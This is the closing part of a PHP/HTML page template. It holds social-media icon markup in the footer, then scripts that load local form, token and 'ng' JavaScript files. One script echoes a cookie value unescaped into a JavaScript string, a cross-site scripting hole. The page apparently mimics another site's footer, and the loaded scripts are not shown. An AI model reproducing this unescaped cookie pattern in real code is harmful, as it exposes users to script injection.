                                                <path d="M12.2684062,6.92105625 L12.0079687,9.37749375 L10.0459688,9.37749375 L10.0459688,16.5060563 L7.09565625,16.5060563 L7.09565625,9.37749375 L5.62471875,9.37749375 L5.62471875,6.92105625 L7.09565625,6.92105625 L7.09565625,5.44168125 C7.09565625,3.44368125 7.92590625,2.25005625 10.2878438,2.25005625 L12.2509687,2.25005625 L12.2509687,4.70705625 L11.0224687,4.70705625 C10.1050312,4.70705625 10.0448438,5.05299375 10.0448438,5.69255625 L10.0448438,6.92161875 L12.2684062,6.92161875 L12.2684062,6.92105625 Z" id="shape"></path>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </svg> </a> </li>
                    <li class="social-list__item rfs2-display-inline-flex"> <a target="_blank" class="social-list__link rfs2-justify-content-center rfs2-align-items-center"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="17px" height="17px" viewBox="0 0 17 17" version="1.1">
                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="XS-/-Footer" transform="translate(-80.000000, -205.000000)" fill="#AAAAAA">
                                        <g id="Group" transform="translate(10.000000, 197.000000)">
                                            <g id="icons/functioneel/instagram" transform="translate(69.000000, 7.000000)">
                                                <path d="M15.639408,3.313179 C15.639408,3.19600044 15.5428891,3.099609 15.425253,3.099609 L3.313413,3.099609 C3.19542071,3.099609 3.099258,3.19577171 3.099258,3.313179 L3.099258,15.425019 C3.099258,15.5436174 3.19485674,15.639174 3.313413,15.639174 L15.426423,15.639174 C15.5437882,15.639174 15.639993,15.5430539 15.639993,15.425019 L15.639408,3.313179 Z M17.046243,15.424985 C17.046243,16.3199818 16.3201614,17.045424 15.426423,17.045424 L3.313413,17.045424 C2.41834499,17.045424 1.693008,16.3204065 1.693008,15.425019 L1.693008,3.313179 C1.693008,2.41912129 2.41877029,1.693359 3.313413,1.693359 L15.425253,1.693359 C16.3191239,1.693359 17.045658,2.41893376 17.045658,3.31314504 L17.046243,15.424985 Z M9.2548485,6.6887595 C7.63157821,6.6887595 6.3157635,8.0047202 6.3157635,9.6278445 C6.3157635,11.2513343 7.63135871,12.5669295 9.2548485,12.5669295 C10.8778263,12.5669295 12.1933485,11.2512613 12.1933485,9.6278445 C12.1933485,8.00479321 10.8776068,6.6887595 9.2548485,6.6887595 Z M9.2548485,5.2825095 C11.6543271,5.2825095 13.5995985,7.22821262 13.5995985,9.6278445 C13.5995985,12.0278768 11.6545116,13.9731795 9.2548485,13.9731795 C6.85470829,13.9731795 4.9095135,12.0279847 4.9095135,9.6278445 C4.9095135,7.22810469 6.85489285,5.2825095 9.2548485,5.2825095 Z M13.628952,4.065255 C14.259582,4.065255 14.771457,4.57713 14.771457,5.20776 C14.771457,5.838975 14.259582,6.350265 13.628952,6.350265 C12.997737,6.350265 12.486447,5.838975 12.486447,5.20776 C12.486447,4.57713 12.997737,4.065255 13.628952,4.065255 Z" id="shape"></path>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </svg> </a> </li>
                    <li class="social-list__item rfs2-display-inline-flex"> <a target="_blank" class="social-list__link rfs2-justify-content-center rfs2-align-items-center"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="17px" viewBox="0 0 18 17" version="1.1">
                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="XS-/-Footer" transform="translate(-259.000000, -206.000000)" fill="#AAAAAA">
                                        <g id="Group" transform="translate(10.000000, 197.000000)">
                                            <g id="icons/functioneel/linkedin" transform="translate(248.000000, 8.000000)">
                                                <path d="M18.5420741,17.1865625 L14.8379074,17.1865625 L14.8379074,11.4321875 C14.8379074,9.9865625 14.2986481,9.0003125 12.9589259,9.0003125 C11.9348519,9.0003125 11.3268889,9.6621875 11.0553148,10.3028125 C10.9658704,10.5421875 10.9321667,10.8559375 10.9321667,11.1815625 L10.9321667,17.1853125 L7.228,17.1853125 C7.27337037,7.4353125 7.228,6.4265625 7.228,6.4265625 L10.9321667,6.4265625 L10.9321667,7.9890625 L10.9088333,7.9890625 C11.393,7.2515625 12.272537,6.1765625 14.275963,6.1765625 C16.7188333,6.1765625 18.5420741,7.7184375 18.5420741,11.0190625 L18.5420741,17.1865625 Z M1.46401852,17.1865625 L5.1792037,17.1865625 L5.1792037,6.4278125 L1.46401852,6.4278125 L1.46401852,17.1865625 Z M3.32161111,4.9615625 L3.29892593,4.9615625 C2.04864815,4.9615625 1.25012963,4.1371875 1.25012963,3.1059375 C1.25012963,2.0528125 2.083,1.2496875 3.34364815,1.2496875 C4.61596296,1.2496875 5.40346296,2.0528125 5.41577778,3.1059375 C5.4267963,4.1365625 4.61661111,4.9615625 3.32161111,4.9615625 L3.32161111,4.9615625 Z" id="shape"></path>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </svg> </a> </li>
                    <li class="social-list__item rfs2-display-inline-flex"> <a target="_blank" class="social-list__link rfs2-justify-content-center rfs2-align-items-center"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="16px" viewBox="0 0 18 16" version="1.1">
                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="XS-/-Footer" transform="translate(-139.000000, -205.000000)" fill="#AAAAAA">
                                        <g id="Group" transform="translate(10.000000, 197.000000)">
                                            <g id="icons/functioneel/twitter" transform="translate(126.000000, 4.000000)">
                                                <path d="M19.1499422,8.23666294 C19.1633108,8.40128036 19.1633108,8.56513566 19.1633108,8.72899096 C19.1633108,13.7338177 15.4498267,19.5 8.6652913,19.5 C6.57534247,19.5 4.6331903,18.8796362 3,17.8004776 C3.29633603,17.8362971 3.5822743,17.848491 3.89049348,17.848491 C5.61577818,17.848491 7.20217858,17.2517529 8.47070474,16.2312773 C6.84865489,16.1954578 5.49026242,15.1056295 5.02162073,13.6057819 C5.24962865,13.6416015 5.47837927,13.664465 5.71827034,13.664465 C6.04951312,13.664465 6.3807559,13.6172137 6.68897508,13.5364292 C4.99785443,13.1828066 3.73081367,11.6600955 3.73081367,9.82034346 L3.73081367,9.77309217 C4.22173626,10.0543136 4.79287011,10.2303628 5.39816801,10.2539884 C4.40443968,9.57341734 3.75383727,8.41347424 3.75383727,7.10110761 C3.75383727,6.39843512 3.93654068,5.75292145 4.25590031,5.19124073 C6.07253672,7.48826339 8.80194752,8.98811096 11.8618584,9.15272838 C11.8054134,8.87074484 11.7705067,8.57885378 11.7705067,8.28467635 C11.7705067,6.19876029 13.4170655,4.5 15.4609672,4.5 C16.5230236,4.5 17.4833306,4.95650848 18.1569566,5.69576263 C18.9910051,5.53190733 19.7894042,5.21486638 20.4971943,4.78122142 C20.2246245,5.6599431 19.6416075,6.39919724 18.8766298,6.86713749 C19.6178412,6.78482878 20.3382571,6.5744843 21,6.281069 C20.4971943,7.03023067 19.8711008,7.69936998 19.1499422,8.23666294" id="shape"></path>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </svg> </a> </li>
                    <li class="social-list__item rfs2-display-inline-flex"> <a target="_blank" class="social-list__link rfs2-justify-content-center rfs2-align-items-center"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 176 124">
                                <path d="M180.32,53.36A22.12,22.12,0,0,0,164.76,37.7C151,34,96,34,96,34s-55,0-68.76,3.7A22.12,22.12,0,0,0,11.68,53.36C8,67.18,8,96,8,96s0,28.82,3.68,42.64A22.12,22.12,0,0,0,27.24,154.3C41,158,96,158,96,158s55,0,68.76-3.7a22.12,22.12,0,0,0,15.56-15.66C184,124.82,184,96,184,96S184,67.18,180.32,53.36Z" transform="translate(-8 -34)"></path>
                                <polygon points="70 88.17 116 62 70 35.83 70 88.17" fill="#fff"></polygon>
                            </svg> </a> </li>
                </ul>
            </div>
        </section>
    </footer>
    <div class="usabilla_live_button_container" role="button" tabindex="0" style="width:40px;height:130px;position:fixed;z-index:999;right:0;top:50%;margin-top:-65px"></div>
    <div class="kxhead" style="display:none !important;"><span class="kxtag kxinvisible"></span><span class="kxtag kxinvisible"></span><span class="kxtag kxinvisible"></span></div>




<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body></html>